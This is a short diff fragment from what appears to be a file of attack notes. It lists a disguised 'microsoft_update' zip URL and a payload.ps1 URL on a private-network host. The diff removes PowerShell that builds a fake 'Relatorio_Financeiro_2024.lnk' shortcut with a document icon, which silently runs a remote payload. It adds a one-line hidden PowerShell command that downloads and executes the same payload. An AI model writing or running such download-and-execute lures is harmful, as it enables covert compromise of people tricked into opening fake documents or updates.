@@ -23,12 +23,8 @@ http://192.168.1.137:8080/microsoft_update.page.zip
 
 http://192.168.1.137/payload.ps1
 
-$WshShell = New-Object -ComObject WScript.Shell
-$Shortcut = $WshShell.CreateShortcut("$env:USERPROFILE\Desktop\Relatorio_Financeiro_2024.lnk")
-$Shortcut.TargetPath = "powershell.exe"
-$Shortcut.Arguments = "-WindowStyle Hidden -Exec Bypass -Command `"IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')`""
-$Shortcut.IconLocation = "C:\Windows\System32\shell32.dll,10"
-$Shortcut.Save()
+powershell.exe -WindowStyle Hidden -Exec Bypass -Command "IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.137/payload.ps1')"
+
 
 
  
